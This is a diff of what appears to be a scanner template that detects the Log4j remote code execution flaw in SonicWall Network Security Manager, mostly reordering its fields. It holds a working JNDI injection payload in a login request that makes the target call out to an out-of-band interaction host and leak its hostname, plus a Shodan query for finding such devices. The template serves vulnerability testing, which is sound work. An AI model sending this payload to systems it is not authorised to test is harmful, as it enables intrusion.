@@ -1,5 +1,4 @@
 id: sonicwall-nsm-log4j-rce
-
 info:
   name: Sonicwall NSM - Remote Code Execution (Apache Log4j)
   author: shaikhyaser
@@ -17,15 +16,40 @@ info:
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
+    product: network_security_manager
+    shodan-query: title:"SonicWall Network Security"
     vendor: sonicwall
-  tags: cve,cve2021,rce,jndi,log4j,sonicwall,oast,kev,vuln
+  tags: cve,cve2021,jndi,kev,log4j,oast,rce,sonicwall,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-  str: "{{rand_base(5)}}"
-
+  str: '{{rand_base(5)}}'
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         POST /api/sonicos/auth HTTP/1.1
         Host: {{Hostname}}
@@ -38,33 +62,3 @@ http:
         Referer: {{RootURL}}
 
         {"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
